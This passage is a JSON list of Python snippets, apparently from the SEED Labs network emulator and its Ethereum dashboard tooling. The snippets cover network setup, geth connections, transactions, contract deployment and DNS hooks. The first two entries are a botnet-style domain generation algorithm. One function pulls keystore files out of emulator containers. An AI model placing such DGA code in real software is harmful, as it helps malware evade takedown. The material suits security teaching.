[
  "def dga() -> list:\n    #Generate 10 domains for the given time.\n    domain_list = []\n    domain = \"\"\n    import math, datetime\n    today = datetime.datetime.utcnow()\n    hour = today.hour\n    day = today.day\n    minute = today.minute\n    minute = int(math.ceil(minute/5))*5\n\n    for i in range(16):\n        day = ((day ^ 8 * day) >> 11) ^ ((day & 0xFFFFFFF0) << 17)\n        hour = ((hour ^ 4 * hour) >> 25) ^ 16 * (hour & 0xFFFFFFF8)\n        minute = ((minute ^ (minute << 13)) >> 19) ^ ((minute & 0xFFFFFFFE) << 12)\n        domain += chr(((day ^ hour ^ minute) % 25) + 97)\n        if i > 6:\n            domain_list.append(domain+ \".com\")\n\n    return domain_list",
  "def dga() -> list:\n    #Generate 10 domains for the given time.\n    domain_list = []\n    domain = \"\"\n    import math, datetime\n    today = datetime.datetime.utcnow()\n    hour = today.hour\n    day = today.day\n    minute = today.minute\n    minute = int(math.ceil(minute/5))*5\n\n    for i in range(16):\n        day = ((day ^ 8 * day) >> 11) ^ ((day & 0xFFFFFFF0) << 17)\n        hour = ((hour ^ 4 * hour) >> 25) ^ 16 * (hour & 0xFFFFFFF8)\n        minute = ((minute ^ (minute << 13)) >> 19) ^ ((minute & 0xFFFFFFFE) << 12)\n        domain += chr(((day ^ hour ^ minute) % 25) + 97)\n        if i > 6:\n            domain_list.append(domain+ \".com\")\n\n    return domain_list",
  "def make_real_as(asn: int, exchange: int, exchange_ip: str):\n    real_as = base.createAutonomousSystem(asn)\n    real_router = real.createRealWorldRouter(real_as)\n\n    real_router.joinNetwork('ix{}'.format(exchange), exchange_ip)",
  "def make_service_as(asn: int, services: List[Service], exchange: int):\n    service_as = base.createAutonomousSystem(asn)\n\n    router = service_as.createRouter('router0')\n\n    net = service_as.createNetwork('net0')\n\n    \n\n    router.joinNetwork('net0')\n\n    router.joinNetwork('ix{}'.format(exchange))\n\n    for service in services:\n        name = 's_{}'.format(service.getName().lower())\n\n        server = service_as.createHost(name)\n        #server1 = service_as.createHost(name)\n\n        server.joinNetwork('net0')\n\n        service.install(name)\n        sim.addBinding(Binding(name, filter = Filter(asn = asn, nodeName=name)))",
  "def make_dns_as(asn: int, zones: List[str], exchange: int):\n    dns_as = base.createAutonomousSystem(asn)\n\n    router = dns_as.createRouter('router0')\n\n    net = dns_as.createNetwork('net0')\n\n    \n\n    router.joinNetwork('net0')\n\n    router.joinNetwork('ix{}'.format(exchange))\n\n    for zone in zones:\n        name = 's_{}dns'.format(zone.replace('.','_'))\n\n        server = dns_as.createHost(name)\n\n        server.joinNetwork('net0')\n\n        dns.install(name).addZone(zone)\n        sim.addBinding(Binding(name, filter = Filter(asn = asn, nodeName=name)))",
  "def make_user_as(asn: int, exchange: str):\n    user_as = base.createAutonomousSystem(asn)\n\n    router = user_as.createRouter('router0')\n\n    net = user_as.createNetwork('net0')\n\n    \n\n    real.enableRealWorldAccess(user_as, 'net0')\n\n    router.joinNetwork('net0')\n    router.joinNetwork('ix{}'.format(exchange))",
  "def make_transit_as(asn: int, exchanges: List[int], intra_ix_links: List[Tuple[int, int]]):\n    transit_as = base.createAutonomousSystem(asn)\n\n    routers: Dict[int, Router] = {}\n\n    for ix in exchanges:\n        routers[ix] = transit_as.createRouter('r{}'.format(ix))\n        routers[ix].joinNetwork('ix{}'.format(ix))\n\n    for (a, b) in intra_ix_links:\n        name = 'net_{}_{}'.format(a, b)\n\n        net = transit_as.createNetwork(name)\n\n        \n\n        routers[a].joinNetwork(name)\n        routers[b].joinNetwork(name)",
  "class Config(object):\n   NAME     = 'SEED Labs'\n   CONSENSUS = 'POA'\n   DEFAULT_URL  = 'http://10.154.0.72:8545'\n   ETH_NODE_NAME_PATTERN = 'Ethereum-POS'\n   DEFAULT_CHAIN_ID = 1337\n   CLIENT_WAITING_TIME = 10  # seconds\n\n   KEY_DERIVATION_PATH = \"m/44'/60'/0'/0/{}\"\n   MNEMONIC_PHRASE =  \"great amazing fun seed lab protect network system \" \\\n                      \"security prevent attack future\"\n   LOCAL_ACCOUNT_NAMES = ['Alice', 'Bob', 'Charlie', 'David', 'Eve', 'Frank']",
  "def create_app(test_config=None):\n    app = Flask(__name__, instance_relative_config=True)\n    client = docker.from_env()\n\n    is_ready = 0\n    containers_len = len(client.containers.list())\n    while True:\n        print(\"waiting for all containers to be ready...\")\n        time.sleep(3)\n        new_containers_len = len(client.containers.list())\n        if containers_len == new_containers_len:\n            is_ready += 1\n        else:\n            is_ready = 0\n        if is_ready > 3:\n            break\n        containers_len = new_containers_len\n    \n    # Load the configuration \n    if test_config is None:\n        app.config.from_object(Config)\n    else:\n        app.config.from_mapping(test_config)\n    \n    # Set the global parameters using the configuration data \n    app.configure = {}\n    app.configure['eth_node_name_pattern'] = Config.ETH_NODE_NAME_PATTERN\n    app.configure['client_waiting_time']   = Config.CLIENT_WAITING_TIME\n    app.configure['key_derivation_path']   = Config.KEY_DERIVATION_PATH \n    app.configure['mnemonic_phrase']       = Config.MNEMONIC_PHRASE \n    app.configure['local_account_names']   = Config.LOCAL_ACCOUNT_NAMES \n\n    # Load the data from the emulator\n    app.eth_accounts = load_eth_accounts(app.root_path)\n    app.eth_nodes    = load_eth_nodes(app.root_path)\n    # Pick the first for the default web3 URL\n    eth_nodes_list = list(app.eth_nodes.items())\n    assert len(eth_nodes_list) > 0\n    app.web3_url  = \"http://%s:8545\" % eth_nodes_list[0][1]['ip'] \n    print(app.web3_url)\n\n    # Get the consensus from the emulator\n    app.consensus = get_eth_consensus()\n\n    # Load blueprint modules\n    from server.general.views import general\n    from server.blockchain.blockchain import blockchain\n    from server.beaconchain.view import beaconchain\n\n    app.register_blueprint(general)\n    app.register_blueprint(blockchain)\n    app.register_blueprint(beaconchain)\n\n    return app",
  "def load_eth_accounts(root_path):\n    path = os.path.join(root_path, \"emulator_data\")\n    filename  = os.path.join(path, \"accounts.json\")\n\n    if os.path.exists(filename) is False: # the file does not exist\n        getEmulatorAccounts(path, \"accounts.json\")\n\n    with open(filename) as json_file:\n        eth_accounts = json.load(json_file)\n\n    counters = {}\n    new_eth_accounts = {}\n    for address in eth_accounts:\n        account = eth_accounts[address]\n        #if self._chain_id != int(account['chain_id']):\n        #    continue\n\n        # Name might be duplicate, should we deal with it? \n        name = account['name']\n        if name not in counters: # name already exists\n            counters[name] = 0\n        else:\n            counters[name] += 1\n            name = name + \"-%d\" % counters[name]\n\n        new_eth_accounts[address] = {\"name\": name,\n                                     \"chain_id\": account['chain_id']}\n\n    return new_eth_accounts",
  "def load_eth_nodes(root_path):\n    eth_nodes = {}\n    path = os.path.join(root_path, \"emulator_data\")\n    filename  = os.path.join(path, \"containers.json\")\n    if os.path.exists(filename) is False: # the file does not exist\n        getContainerInfo(path, \"containers.json\")\n\n    with open(filename) as json_file:\n        eth_nodes = json.load(json_file)\n\n    return eth_nodes",
  "def getEmulatorAccounts(path, filename):\n    os.system(\"mkdir -p {}\".format(path))\n\n    client = docker.from_env()\n    all_containers = client.containers.list()\n\n    mapping = {}\n    counters = {}\n    for container in all_containers:\n      labels = container.attrs['Config']['Labels']\n      if 'EthereumService' in labels.get('org.seedsecuritylabs.seedemu.meta.class', []):\n          chain_id = labels.get('org.seedsecuritylabs.seedemu.meta.ethereum.chain_id')\n\n          # record which container each key file comes from\n        #   cmd = ['docker', 'exec', container.short_id, 'ls', '-1', '/root/.ethereum/keystore']\n          exit_code, output = container.exec_run('ls /root/.ethereum/keystore')\n          keyfilenames = output.decode(\"utf-8\").rstrip().split('\\n')\n          for keyfilename in keyfilenames:\n              keyfile = '/root/.ethereum/keystore/' + keyfilename\n              keyname = labels.get('org.seedsecuritylabs.seedemu.meta.displayname')\n\n              print(\"Getting the key file from %s\" % keyname)\n            #   cmd = ['docker', 'exec', container.short_id, 'cat', keyfile]\n              exit_code, output = container.exec_run('cat {}'.format(keyfile))\n              encrypted_key = output.decode(\"utf-8\").rstrip().split('\\n')[0]\n              account = json.loads(encrypted_key)\n              address = Web3.toChecksumAddress(account[\"address\"]) \n              mapping[address] = {\n                      'name':     keyname,\n                      'chain_id': chain_id\n              }\n\n    save_to_file = os.path.join(path, filename)\n    with open(save_to_file, 'w') as json_file:\n        json.dump(mapping, json_file, indent = 4)\n\n    return",
  "def getContainerInfo(path, filename):\n    os.system(\"mkdir -p {}\".format(path))\n\n    client = docker.from_env()\n    all_containers = client.containers.list()\n\n    mapping_all = {}\n    for container in all_containers:\n      labels = container.attrs['Config']['Labels']\n      if 'EthereumService' in labels.get('org.seedsecuritylabs.seedemu.meta.class', []):\n        info_map = {}\n        info_map[\"container_id\"] = container.short_id\n        info_map[\"displayname\"] = labels.get(\"org.seedsecuritylabs.seedemu.meta.displayname\")\n        ip = labels.get(\"org.seedsecuritylabs.seedemu.meta.net.0.address\")\n        info_map[\"ip\"] = ip.replace(\"/24\", \"\") # remove the network mask\n        info_map[\"node_id\"] = labels.get(\"org.seedsecuritylabs.seedemu.meta.ethereum.node_id\")\n        info_map[\"chain_id\"] = labels.get(\"org.seedsecuritylabs.seedemu.meta.ethereum.chain_id\")\n        info_map[\"node_role\"] = labels.get(\"org.seedsecuritylabs.seedemu.meta.ethereum.role\")\n        info_map[\"consensus\"] = labels.get(\"org.seedsecuritylabs.seedemu.meta.ethereum.consensus\")\n\n        mapping_all[container.name] = info_map\n    \n    save_to_file = os.path.join(path, filename)\n    with open(save_to_file, 'w') as json_file:\n        json.dump(mapping_all, json_file, indent = 4)\n\n    return",
  "def get_eth_consensus():\n    client = docker.from_env()\n    all_containers = client.containers.list()\n\n    for container in all_containers:\n        labels = container.attrs['Config']['Labels']\n        if 'EthereumService' in labels.get('org.seedsecuritylabs.seedemu.meta.class', []):\n            return labels.get(\"org.seedsecuritylabs.seedemu.meta.ethereum.consensus\")",
  "def load_genesis_time(root_path):\n    path = os.path.join(root_path, \"emulator_data\")\n    filename  = os.path.join(path, \"genesis_timestamp.json\")\n\n    if os.path.exists(filename) is False: # the file does not exist\n        return -1\n\n    with open(filename) as json_file:\n        timestamp = json.load(json_file)\n    \n    return timestamp",
  "def get_genesis_time(web3_url, consensus):\n    web3  = connect_to_geth(web3_url, consensus)\n    return web3.eth.getBlock(0).timestamp",
  "def connect_to_geth(url, consensus):\n  if   consensus==  'POA': \n        return connect_to_geth_poa(url)\n  elif consensus == 'POS':\n        return connect_to_geth_pos(url)\n  elif consensus == 'POW':\n        return connect_to_geth_pow(url)",
  "def connect_to_geth_pos(url):\n   web3 = Web3(Web3.HTTPProvider(url))\n   if not web3.isConnected():\n      sys.exit(\"Connection failed!\") \n   web3.middleware_onion.inject(geth_poa_middleware, layer=0)\n\n   return web3",
  "def connect_to_geth_poa(url):\n   web3 = Web3(Web3.HTTPProvider(url))\n   if not web3.isConnected():\n      sys.exit(\"Connection failed!\") \n   web3.middleware_onion.inject(geth_poa_middleware, layer=0)\n   return web3",
  "def connect_to_geth_pow(url):\n   web3 = Web3(Web3.HTTPProvider(url))\n   if not web3.isConnected():\n      sys.exit(\"Connection failed!\")\n   return web3",
  "def getFileContent(file_name):\n    file = open(file_name, \"r\")\n    data = file.read()\n    file.close()\n    return data.replace(\"\\n\",\"\")",
  "def getContent(file_name):\n    file = open(file_name, \"r\")\n    data = file.read()\n    file.close()\n    return data.replace(\"\\n\",\"\")",
  "def connect_to_geth(url, consensus):\n  if   consensus==  'POA': \n        return connect_to_geth_poa(url)\n  elif consensus == 'POS':\n        return connect_to_geth_pos(url)\n  elif consensus == 'POW':\n        return connect_to_geth_pow(url)",
  "def connect_to_geth_pos(url):\n   web3 = Web3(Web3.HTTPProvider(url))\n   if not web3.isConnected():\n      sys.exit(\"Connection failed!\") \n   return web3",
  "def connect_to_geth_poa(url):\n   web3 = Web3(Web3.HTTPProvider(url))\n   if not web3.isConnected():\n      sys.exit(\"Connection failed!\") \n   web3.middleware_onion.inject(geth_poa_middleware, layer=0)\n   return web3",
  "def connect_to_geth_pow(url):\n   web3 = Web3(Web3.HTTPProvider(url))\n   if not web3.isConnected():\n      sys.exit(\"Connection failed!\")\n   return web3",
  "def get_account_address(index):\n   file_list = os.listdir('keystore/eth')\n   if 'index.json' in file_list:\n       file_list.remove('index.json')\n   f = file_list[index]\n   with open('keystore/eth/{}'.format(f)) as keyfile:\n      content = json.loads(keyfile.read())\n   return Web3.toChecksumAddress(content['address'])",
  "def get_account_total():\n   file_list = os.listdir('keystore/eth')\n   if 'index.json' in file_list:\n       file_list.remove('index.json')\n\n   return len(file_list)",
  "def get_all_account_addresses():\n   accounts = []\n   file_list = os.listdir('keystore/eth')\n   if 'index.json' in file_list:\n       file_list.remove('index.json')\n\n   for f in file_list:\n      with open('keystore/eth/{}'.format(f)) as keyfile:\n         content = json.loads(keyfile.read())\n         if 'address' in content:\n            accounts.append(Web3.toChecksumAddress(content['address'])) \n   return accounts",
  "def get_all_accounts_with_node_info():\n   f = open('keystore/eth/index.json')\n   accounts = json.load(f)\n   return accounts",
  "def print_balance(web3, account):\n    print(\"{}: {}\".format(account, web3.eth.get_balance(account)))",
  "def construct_raw_transaction(sender, recipient, nonce, amount, data):\n   tx = {\n     'nonce': nonce,\n     'from':  sender,\n     'to':    recipient,\n     'value': Web3.toWei(amount, 'ether'),\n     'gas': 2000000,\n     'chainId': 10,  # Must match with the value used in the emulator\n     'gasPrice': Web3.toWei('50', 'gwei'),\n     'data':  data\n    }\n   return tx",
  "def send_raw_transaction(web3, sender, recipient, amount, data):\n   print(\"---------Sending Raw Transaction ---------------\")\n   nonce  = web3.eth.getTransactionCount(sender.address)\n   tx = construct_raw_transaction(sender.address, recipient, nonce, amount, data)\n   signed_tx  = web3.eth.account.sign_transaction(tx, sender.key)\n   tx_hash    = web3.eth.sendRawTransaction(signed_tx.rawTransaction)\n   print(\"Transaction Hash: {}\".format(tx_hash.hex()))\n\n   tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)\n   print(\"Transaction Receipt: {}\".format(tx_receipt))\n   return tx_receipt",
  "def send_raw_transaction_no_wait(web3, sender, recipient, amount, data):\n   print(\"---------Sending Raw Transaction ---------------\")\n   nonce  = web3.eth.getTransactionCount(sender.address)\n   tx = construct_raw_transaction(sender.address, recipient, nonce, amount, data)\n   signed_tx  = web3.eth.account.sign_transaction(tx, sender.key)\n   tx_hash    = web3.eth.sendRawTransaction(signed_tx.rawTransaction)\n   print(\"Transaction Hash: {}\".format(tx_hash.hex()))\n   return tx_hash",
  "def send_transaction_via_geth(node, recipient, amount, data):\n   print(\"---------Sending Transaction from a geth node ---------------\")\n   tx_hash = node.eth.send_transaction({\n         'from':  node.eth.coinbase,\n         'to':    recipient,\n         'value': amount,\n         'data':  data})\n   print(\"Transaction Hash: {}\".format(tx_hash.hex()))\n\n   tx_receipt = node.eth.wait_for_transaction_receipt(tx_hash)\n   print(\"Transaction Receipt: {}\".format(tx_receipt))\n   return tx_receipt",
  "def deploy_contract_via_geth(node, abi_file, bin_file):\n    print(\"---------Deploying Contract from a geth node ----------------\")\n    abi = getContent(abi_file)\n    bytecode = getContent(bin_file)\n\n    myContract = node.eth.contract(abi=abi, bytecode=bytecode)\n    tx_hash = myContract.constructor().transact({ 'from':  node.eth.coinbase })\n    print(\"... Waiting for block\")\n    tx_receipt = node.eth.wait_for_transaction_receipt(tx_hash)\n    contract_address = tx_receipt.contractAddress\n    print(\"Transaction Hash: {}\".format(tx_receipt.transactionHash.hex()))\n    print(\"Transaction Receipt: {}\".format(tx_receipt))\n    print(\"Contract Address: {}\".format(contract_address))\n    return contract_address",
  "def deploy_contract_low_level_via_geth(node, abi_file, bin_file):\n    print(\"---------Deploying Contract from a geth node (low level) ----------\")\n    bytecode = getContent(bin_file)\n    tx_receipt = send_transaction_via_geth(node, None, 0, bytecode)\n    contract_address = tx_receipt.contractAddress\n    print(\"Contract Address: {}\".format(contract_address))\n    return contract_address",
  "def deploy_contract_raw(web3, sender, bin_file):\n    print(\"---------Deploying Raw Contract (low level) ----------\")\n    bytecode = getContent(bin_file)\n    tx_receipt = send_raw_transaction(web3, sender, None, 0, bytecode)\n    contract_address = tx_receipt.contractAddress\n    print(\"Contract Address: {}\".format(contract_address))\n    return contract_address",
  "def invoke_contract_via_geth(node, contract_address, abi_file, function, arg):\n    print(\"---------Invoking Contract Function via a geth node --------\")\n    new_address = Web3.toChecksumAddress(contract_address)\n    contract = node.eth.contract(address=new_address, abi=getContent(abi_file))\n    contract_func = contract.functions[function]\n\n    # Invoke the function locally. We can immediately get the return value\n    r = contract_func(arg).call()\n    print(\"Return value: {}\".format(r))\n\n    # Invoke the function as a transaction. We cannot get the return value.\n    # The function emits return value using an event, which is included in\n    # the logs array of the transaction receipt.\n    tx_hash = contract_func(arg).transact({ 'from':  node.eth.coinbase })\n    tx_receipt = node.eth.wait_for_transaction_receipt(tx_hash)\n    print(\"Transaction Hash: {}\".format(tx_receipt.transactionHash.hex()))\n    print(\"Transaction Receipt: {}\".format(tx_receipt))\n    return tx_receipt",
  "def send_geth_rpc(url, method, params):\n   myobj = {\"jsonrpc\":\"2.0\",\"id\":1}\n   myobj[\"method\"] = method\n   myobj[\"params\"] = params\n\n   x = requests.post(url, json = myobj)\n   y = json.loads(x.text)\n   return y[\"result\"]",
  "class HexJsonEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, HexBytes):\n            return obj.hex()\n        return super().default(obj)",
  "def get_balance():\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n\n    balance = {}\n    for addr in app.eth_accounts:\n        caddr = Web3.toChecksumAddress(addr)\n        balance[addr] = web3.fromWei(web3.eth.get_balance(caddr), 'ether')\n\n    for addr in app.local_accounts:\n        caddr = Web3.toChecksumAddress(addr)\n        balance[addr] = web3.fromWei(web3.eth.get_balance(caddr), 'ether')\n\n    return balance",
  "def get_balance_with_name():\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n\n    balance = {}\n    for addr in app.eth_accounts:\n        node = {}\n        caddr = Web3.toChecksumAddress(addr)\n        node['balance']   = web3.fromWei(web3.eth.get_balance(caddr), 'ether')\n        full_name = app.eth_accounts[addr]['name']\n        node['node_name'] = app.eth_nodes[full_name]['displayname']\n        balance[addr] = node\n\n    for addr in app.local_accounts:\n        node = {}\n        caddr = Web3.toChecksumAddress(addr)\n        node['balance']   = web3.fromWei(web3.eth.get_balance(caddr), 'ether')\n        node['node_name'] = app.local_accounts[addr]['name']\n        balance[caddr] = node\n\n    return balance",
  "def get_balance_of_account(addr):\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n    caddr = Web3.toChecksumAddress(addr)\n    node = {}\n    node['account'] = caddr\n    node['balance'] = web3.fromWei(web3.eth.get_balance(caddr), 'ether')\n\n    return node",
  "def get_signers(lastN):\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n    latest = web3.eth.getBlock('latest').number\n    start = latest - int(lastN) + 1\n    if start <= 0:\n       start = 1\n    \n    signers = {}\n    for bk in range(start, latest+1):\n       bkhash = web3.eth.getBlock(bk).hash\n       result = send_geth_rpc(app.web3_url, \"clique_getSigner\", [bkhash.hex()])\n       addr =  Web3.toChecksumAddress(result)\n\n       name = app.eth_accounts[str(addr)]['name']\n       container_id = app.eth_nodes[name]['container_id']\n       \n       signers[bk] = {'address': str(addr), 'container_name': name, \n                      'container_id': container_id}   \n\n    return signers",
  "def get_transaction(txhash):\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n\n    try:\n       tx = dict(web3.eth.get_transaction(txhash))\n    except:\n       tx = {\"status\": \"No such transaction\"}\n\n    resp = Response(json.dumps(tx, cls=HexJsonEncoder, indent=5))\n    resp.headers['Content-Type'] = 'application/json'\n    return resp",
  "def get_transaction_receipt(txhash):\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n\n    try:\n       tx = dict(web3.eth.get_transaction_receipt(txhash))\n    except:\n       tx = {\"status\": \"No such transaction\"}\n\n    resp = Response(json.dumps(tx, cls=HexJsonEncoder, indent=5))\n    resp.headers['Content-Type'] = 'application/json'\n    return resp",
  "def get_block(blockNumber):\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n    if blockNumber == 'latest':\n        blockNumber = web3.eth.getBlock('latest').number\n\n    block = web3.eth.get_block(int(blockNumber))\n\n    resp = Response(json.dumps(dict(block), cls=HexJsonEncoder, indent=5))\n    resp.headers['Content-Type'] = 'application/json'\n    return resp",
  "def get_lastN_blocks(lastN):\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n    latest = web3.eth.getBlock('latest').number\n    start = latest - int(lastN) + 1\n    if start <= 0:\n       start = 1\n\n    blocks = {}\n    for bk in range(start, latest+1):\n       block = web3.eth.get_block(bk)\n       blocks[bk] = dict(block)\n\n    resp = Response(json.dumps(blocks, cls=HexJsonEncoder, indent=5))\n    resp.headers['Content-Type'] = 'application/json'\n    return resp",
  "def get_txs_from_block(blockNumber):\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n    if blockNumber == 'latest':\n        blockNumber = web3.eth.getBlock('latest').number\n\n    block = web3.eth.get_block(int(blockNumber))\n    transactions = {}\n    for txhash in block.transactions:\n        tx = web3.eth.get_transaction(txhash.hex())\n        transactions[txhash.hex()] = dict(tx)\n\n    resp = Response(json.dumps(transactions, cls=HexJsonEncoder, indent=5))\n    resp.headers['Content-Type'] = 'application/json'\n    return resp",
  "def get_tx_receipts_from_block(blockNumber):\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n    if blockNumber == 'latest':\n        blockNumber = web3.eth.getBlock('latest').number\n\n    block = web3.eth.get_block(int(blockNumber))\n    transactions = {}\n    for txhash in block.transactions:\n        tx = web3.eth.get_transaction_receipt(txhash.hex())\n        transactions[txhash.hex()] = dict(tx)\n\n    resp = Response(json.dumps(transactions, cls=HexJsonEncoder, indent=5))\n    resp.headers['Content-Type'] = 'application/json'\n    return resp",
  "def get_eth_nodes():\n    return app.eth_nodes",
  "def get_base_fees(lastN):\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n    latest = web3.eth.getBlock('latest').number\n    start = latest - int(lastN) + 1\n    if start <= 0:\n       start = 1\n\n    base_fees = {}\n    for bk in range(start, latest+1):\n       block = web3.eth.get_block(bk)\n       #blocks[bk] = dict(block)\n       tt = dict(block)\n       base_fees[bk] = tt['baseFeePerGas']\n\n    resp = Response(json.dumps(base_fees, cls=HexJsonEncoder, indent=5))\n    resp.headers['Content-Type'] = 'application/json'\n    return resp",
  "def get_gas_limits(lastN):\n    web3  = connect_to_geth(app.web3_url, app.consensus)\n    latest = web3.eth.getBlock('latest').number\n    start = latest - int(lastN) + 1\n    if start <= 0:\n       start = 1\n\n    gas_limits = {}\n    for bk in range(start, latest+1):\n       block = web3.eth.get_block(bk)\n       tt = dict(block)\n       gas_limits[bk] = tt['gasLimit']\n\n    resp = Response(json.dumps(gas_limits, cls=HexJsonEncoder, indent=5))\n    resp.headers['Content-Type'] = 'application/json'\n    return resp",
  "def get_txpool_pending():\n    pending = {}\n    for node in app.eth_nodes: \n        node_info = app.eth_nodes[node]\n        ip      = node_info['ip']\n        url = \"http://\" + ip + \":8545\"\n        web3 = Web3(Web3.HTTPProvider(url))\n        web3.middleware_onion.inject(geth_poa_middleware, layer=0)\n\n        txpool = web3.geth.txpool.content()\n        total = 0\n        for key in txpool.pending:\n           total += len(dict(txpool.pending[key]))\n        pending[ip] = total\n\n    resp = Response(json.dumps(pending, cls=HexJsonEncoder, indent=5))\n    resp.headers['Content-Type'] = 'application/json'\n    return resp",
  "def get_accounts():\n    accounts =[]\n\n    # Get the accounts from the emulator\n    for address in app.eth_accounts:\n        item = app.eth_accounts[address]\n        accounts.append({\"address\": address,\n                         \"name\":    item[\"name\"],\n                         \"type\":    \"emulator\"})\n\n    # Generate local accounts using the mnemonic phrase. \n    Account.enable_unaudited_hdwallet_features()\n    local_account_names = app.configure['local_account_names']\n    for index in range(len(local_account_names)):\n        account = Account.from_mnemonic(app.configure['mnemonic_phrase'], \n                     account_path=app.configure['key_derivation_path'].format(index))\n        accounts.append({\"address\": account.address, \n                         \"name\":    local_account_names[index],\n                         \"type\":    \"local\"})\n\n    return accounts",
  "def get_web3_providers():\n    providers = []\n    for key in app.eth_nodes: \n        node = app.eth_nodes[key]\n        providers.append(\"http://%s:8545\" % node['ip']) \n\n    return providers",
  "def get_consensus():\n    resp = Response(json.dumps(app.consensus, cls=HexJsonEncoder, indent=5))\n    resp.headers['Content-Type'] = 'application/json'\n    return resp",
  "def default(self, obj):\n        if isinstance(obj, HexBytes):\n            return obj.hex()\n        return super().default(obj)",
  "def home_index():\n    return render_template('index.html')",
  "def account_view():\n    emulator_parameters = {}\n    emulator_parameters[\"web3_provider\"]  = app.web3_url\n    emulator_parameters[\"client_waiting_time\"]  = app.configure['client_waiting_time']\n    return render_template('general-frontend/account-view.html', data = emulator_parameters)",
  "def block_view():\n    emulator_parameters = {}\n    emulator_parameters[\"web3_provider\"]  = app.web3_url\n    emulator_parameters[\"client_waiting_time\"]  = app.configure['client_waiting_time']\n    return render_template('general-frontend/block-view.html', data = emulator_parameters)",
  "def block(blockNumber):\n    emulator_parameters = {}\n    emulator_parameters[\"web3_provider\"]  = app.web3_url\n    emulator_parameters[\"block_number\"]  = blockNumber\n    return render_template('general-frontend/one_block.html', data = emulator_parameters)",
  "def transaction(txHash):\n    emulator_parameters = {}\n    emulator_parameters[\"web3_provider\"]  = app.web3_url\n    emulator_parameters[\"tx_hash\"]  = txHash\n    return render_template('general-frontend/one_tx.html', data = emulator_parameters)",
  "def txpool():\n    return render_template('general-frontend/txpool.html')",
  "def validator_view():\n    return render_template(\"beacon-frontend/validator-view.html\")",
  "def slot_view():\n    return render_template(\"beacon-frontend/slot-view.html\")",
  "def getSlotDetails(slotNumber):\n    return render_template('beacon-frontend/one-slot.html', slotNumber=slotNumber)",
  "def get_beacon_providers():\n    providers = []\n    for key in app.eth_nodes: \n        node = app.eth_nodes[key]\n        providers.append(\"http://%s:8000\" % node['ip'])\n\n    return providers",
  "class BeaconClient:\n    \"\"\"!\n    @brief The BeaconClient class.  \n    \"\"\"\n\n    def __init__(self):\n        \"\"\"!\n        @brief BeaconClient constructor.\n        \"\"\"\n\n        self._beacon_node_url = 'http://10.151.0.71:8000'\n\n    def getValidatorStatus(self):\n        return requests.get(self._beacon_node_url+\"/\"+\"/eth/v1/beacon/states/head/validators\")['data']",
  "class ValidatorClient:\n    \"\"\"!\n    @brief The ValidatorClient class.\n    \"\"\"\n\n    def __init__(self):\n        \"\"\"!\n        @brief ValidatorClient constructor.\n        \"\"\"\n\n        self._validator_node_url = 'http://10.151.0.71:5062'",
  "def __init__(self):\n        \"\"\"!\n        @brief BeaconClient constructor.\n        \"\"\"\n\n        self._beacon_node_url = 'http://10.151.0.71:8000'",
  "def getValidatorStatus(self):\n        return requests.get(self._beacon_node_url+\"/\"+\"/eth/v1/beacon/states/head/validators\")['data']",
  "def __init__(self):\n        \"\"\"!\n        @brief ValidatorClient constructor.\n        \"\"\"\n\n        self._validator_node_url = 'http://10.151.0.71:5062'",
  "class ResolvConfHookByAs(Hook):\n    \"\"\"!\n    @brief ResolvConfHook class. This class allows you to set resolv.conf on\n    all host nodes.\n    \"\"\"\n\n    __servers: List[str]\n\n    def __init__(self, nameservers: List[str], asn: int):\n        \"\"\"!\n        @brief ResolvConfHook constructor.\n\n        \n        \"\"\"\n        self.__servers = nameservers\n        self.__asn = asn\n\n    def getName(self) -> str:\n        return 'ResolvConfHook'\n\n    def getTargetLayer(self) -> str:\n        return 'Base'\n\n    def postrender(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        for ((scope, type, name), object) in reg.getAll().items():\n            if type != 'hnode': continue\n            if scope != self.__asn: continue\n            self._log('setting resolv.conf for as{}/{}'.format(scope, name))\n            host: Node = object\n            host.appendStartCommand(': > /etc/resolv.conf')\n            for s in self.__servers:\n                host.appendStartCommand('echo \"nameserver {}\" >> /etc/resolv.conf'.format(s))",
  "def __init__(self, nameservers: List[str], asn: int):\n        \"\"\"!\n        @brief ResolvConfHook constructor.\n\n        \n        \"\"\"\n        self.__servers = nameservers\n        self.__asn = asn",
  "def getName(self) -> str:\n        return 'ResolvConfHook'",
  "def getTargetLayer(self) -> str:\n        return 'Base'",
  "def postrender(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        for ((scope, type, name), object) in reg.getAll().items():\n            if type != 'hnode': continue\n            if scope != self.__asn: continue\n            self._log('setting resolv.conf for as{}/{}'.format(scope, name))\n            host: Node = object\n            host.appendStartCommand(': > /etc/resolv.conf')\n            for s in self.__servers:\n                host.appendStartCommand('echo \"nameserver {}\" >> /etc/resolv.conf'.format(s))",
  "class ResolvConfHook(Hook):\n    \"\"\"!\n    @brief ResolvConfHook class. This class allows you to set resolv.conf on\n    all host nodes.\n    \"\"\"\n\n    __servers: List[str]\n\n    def __init__(self, nameservers: List[str]):\n        \"\"\"!\n        @brief ResolvConfHook constructor.\n\n        \n        \"\"\"\n        self.__servers = nameservers\n\n    def getName(self) -> str:\n        return 'ResolvConfHook'\n\n    def getTargetLayer(self) -> str:\n        return 'Base'\n\n    def postrender(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        for ((scope, type, name), object) in reg.getAll().items():\n            if type != 'hnode': continue\n            self._log('setting resolv.conf for as{}/{}'.format(scope, name))\n            host: Node = object\n            host.appendStartCommand(': > /etc/resolv.conf')\n            for s in self.__servers:\n                host.appendStartCommand('echo \"nameserver {}\" >> /etc/resolv.conf'.format(s))",
  "def __init__(self, nameservers: List[str]):\n        \"\"\"!\n        @brief ResolvConfHook constructor.\n\n        \n        \"\"\"\n        self.__servers = nameservers",
  "def getName(self) -> str:\n        return 'ResolvConfHook'",
  "def getTargetLayer(self) -> str:\n        return 'Base'",
